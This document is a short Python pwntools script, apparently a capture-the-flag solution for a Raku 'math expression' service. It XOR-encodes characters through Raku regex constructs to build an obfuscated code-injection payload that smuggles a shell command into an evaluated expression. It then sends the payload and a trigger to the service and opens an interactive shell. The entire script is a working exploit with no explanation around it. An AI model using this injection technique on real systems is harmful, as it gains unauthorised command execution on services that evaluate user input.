from pwn import *

D = {0: ''}
for x in '0123456789TF':
    D = {char ^ ord(x): D[char] + x for char in D} | D

T = '((0==0)~~/<$(11/5~^888~^88~^8)>/)'
F = '((0==1)~~/<$(11/5~^888~^88~^8)>/)'
magic = lambda c: '~^'.join(D[c]).replace('T', T).replace('F', F)

payload = '~'.join(f'({magic(c)})' for c in b"0};shell 'sh'#")
print(payload)

# io = process(['raku', 'chal.raku'])
io = remote('localhost', 5000)
io.sendlineafter(b'Enter a math expression: ', payload.encode())
io.sendlineafter(b'Enter a math expression: ', b'$_~~/<$_>/')
io.interactive()
